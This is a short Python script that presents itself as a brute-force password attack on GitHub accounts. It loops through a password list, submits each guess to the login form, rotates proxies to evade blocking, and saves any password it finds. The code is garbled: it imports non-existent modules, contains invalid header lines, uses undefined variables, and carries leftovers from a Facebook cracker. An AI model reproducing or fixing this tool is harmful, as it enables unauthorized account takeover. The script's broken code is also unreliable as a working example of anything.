import python
import os 
import webbrosser
import cookielib
import github 

print ('''

 _____  _____  _____  _   _  _   _ ______ 
|  __ \|_   _||_   _|| | | || | | || ___ \
| |  \/  | |    | |  | |_| || | | || |_/ /
| | __   | |    | |  |  _  || | | || ___ \
| |_\ \ _| |_   | |  | | | || |_| || |_/ /
 \____/ \___/   \_/  \_| |_/ \___/ \____/ 
                                          

''')


def github():
    password_list = io.open(options.list_password,"r").readlines()
    try_login = 0
    print("\rgithub Account: {}".format(options.github))
    print("%s<<<<<<+++++Start  Attacking github+++++>>>>>%s"%(R,W))
    for password in password_list:
        password = password.rstrip('\n')
        try_login += 1
        if try_login == 10:
            try_login = 0
            proxy()
        print('\rPassword [==] {} '.format(password).rstrip("\n"))
        sys.stdout.flush
        url = "https://github.com/login"
        sec-ch-ua-platform: "Windows"
        sec-ch-ua-platform: "Android"

        try:
            brows.open(url, timeout=5)
            brows.select_form(nr=0)
            brows.form['email'] = options.github
            brows.form['pass'] = password
            brows.method = "POST"
            submit = brows.submit()
            if 'https://github.com/?sk=welcome' in  submit.geturl():
                print("{}[True][+] Password Found [{}][+]".format(G,password))
                Save = io.open("github.txt","a").write("Account Facebook:"+options.facebook+"\t\tPassword:"+password+"\n")
                break
            else :
                print("%s[!] False Login Password%s\n"%(R,W))
        except:
            print('[!] <<<There are speeches in Communication>>> \n')
            proxy()




